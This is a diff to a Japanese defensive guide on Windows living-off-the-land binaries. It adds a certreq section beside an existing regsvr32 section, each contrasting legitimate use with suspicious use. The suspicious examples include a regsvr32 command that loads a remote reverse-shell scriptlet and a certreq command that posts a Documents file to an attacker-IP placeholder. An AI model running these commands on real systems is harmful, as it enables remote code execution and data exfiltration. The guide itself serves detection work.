@@ -54,6 +54,14 @@ regsvr32.exe C:\Windows\System32\sample.dll
 regsvr32.exe /s "C:\Program Files\App\extension.dll"
 ```
 ### 不審な挙動
-外部からスクリプトレットを読み込み、メモリ上で悪意のある動作をさせる。  
+外部からスクリプトレットを読み込み、scrobj.dllを利用してメモリ上で悪意のある動作をさせる。  
 通常他プロセスが起動することはないため、スクリプトレットを悪用してPowershellなどを起動すると子プロセスができる。  
 `regsvr32.exe /s /u /i:http://<攻撃者IP>:8000/reverse_shell.sct scrobj.dll`
+
+## Step5 certreq
+### 正規の挙動
+企業ネットワークにおいて、サーバーがデジタル証明書の発行リクエストを送るために使われる。  
+`certreq.exe -submit -config "MyCA.local\Corporate-CA" request.inf`
+### 不審な挙動
+攻撃者に情報をダウンロードする。送信先が外部不明IPだと要注意。  
+`certreq.exe -Post -config http://<攻撃者IP>/receive %USERPROFILE%\Documents\secret_list.txt`
